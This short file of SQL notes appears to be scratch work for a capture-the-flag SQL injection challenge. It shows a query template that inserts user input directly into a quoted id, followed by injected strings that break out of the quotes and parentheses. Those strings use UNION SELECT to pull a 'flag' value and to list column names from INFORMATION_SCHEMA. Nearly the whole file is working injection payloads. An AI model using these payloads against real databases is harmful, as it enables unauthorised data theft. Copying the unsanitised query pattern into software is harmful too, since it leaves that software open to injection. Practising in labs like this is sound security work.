-- SELECT EXISTS()((SELECT 1 FROM your_table_name WHERE id = '$input')) LIMIT 0,1;
-- 3')) UNION select 1,2,3-- -
SELECT EXISTS()((SELECT 1 FROM your_table_name WHERE id = '3')) UNION select 1,2,3 --)) LIMIT 0,1;
SELECT EXISTS((SELECT 1 FROM your_table_name WHERE id = '3' AND '4' > '5')) UNION SELECT flag FROM flag --#')) LIMIT 0,1;

-- 3' AND '4'>'5')) UNION select 1,2,3

-- 3' AND '4' > '5')) UNION SELECT flag FROM flag #

-- SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'flag'

SELECT EXISTS((SELECT 1 FROM your_table_name WHERE id = '
3' AND '4' > '5')) UNION SELECT COLUMN_NAME,NULL,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'flag' LIMIT 1 #
')) LIMIT 0,1;
